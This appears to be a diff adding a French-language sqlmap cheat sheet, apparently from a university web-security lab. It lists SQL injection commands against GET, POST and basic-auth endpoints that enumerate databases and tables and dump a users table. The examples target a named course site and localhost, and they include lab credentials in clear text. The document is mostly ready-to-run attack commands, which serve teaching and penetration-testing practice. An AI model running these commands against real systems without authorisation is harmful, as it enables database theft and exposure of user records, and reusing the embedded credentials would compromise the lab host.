@@ -1,0 +1,46 @@
+--------------------------
+##### SQLMAP avec la method *GET*
+--------------------------
+example :  sqlmap -u "https://cdai.lacl.fr/sweb/notes/notes.php?id=1"
+
+--------------------------
+##### SQLMAP avec la method *POST*
+--------------------------
+example : sqlmap -u http://localhost/fix/auth/ --data="login=aa&password=aa" 
+
+--------------------------
+##### SQLMAP avec la *auth basic*
+--------------------------
+example :  sqlmap -u "https://cdai.lacl.fr/sweb/notes/notes.php?id=1" --auth-type "BASIC" --auth-cred="sweb:swebtp"
+
+--------------------------
+##### Trouvé le *nome de la BDD* actuel
+--------------------------
+example : sqlmap -u http://localhost/fix/auth/ --data="login=aa&password=aa" --current-db
+
+--------------------------
+##### Trouvé les nomes des tous **les tables** acceder par l'utilisateur actuel
+--------------------------
+example :  sqlmap -u "https://cdai.lacl.fr/sweb/notes/notes.php?id=1" --auth-type "BASIC" --auth-cred="sweb:swebtp" --tables
+option  :  on peut ajouter  --technique U
+
+--------------------------
+##### Trouvé **les tables** d'une BDD
+--------------------------
+example : sqlmap -u http://localhost/fix/auth/ --data="login=aa&password=aa" -D sweb --tables
+
+--------------------------
+##### Trouvé le **contenu** d'un table 
+--------------------------
+syntexe   : sqlmap -u "url/vulnirable" --auth-type "BASIC" --auth-cred="username:password" --dump -D databaseName -T tableName
+
+example   : sqlmap -u "https://cdai.lacl.fr/sweb/notes/notes.php?id=1" --auth-type "BASIC" --auth-cred="sweb:swebtp" --dump -D sweb_notes -T users
+
+example 2 : sqlmap -u http://localhost/fix/auth/index.php --data="login=aa&password=aa" -T users --dump
+
+--------------------------
+##### **Supprimer le chach** de sqlmap 
+--------------------------
+
+rm -rf .sqlmap/
+
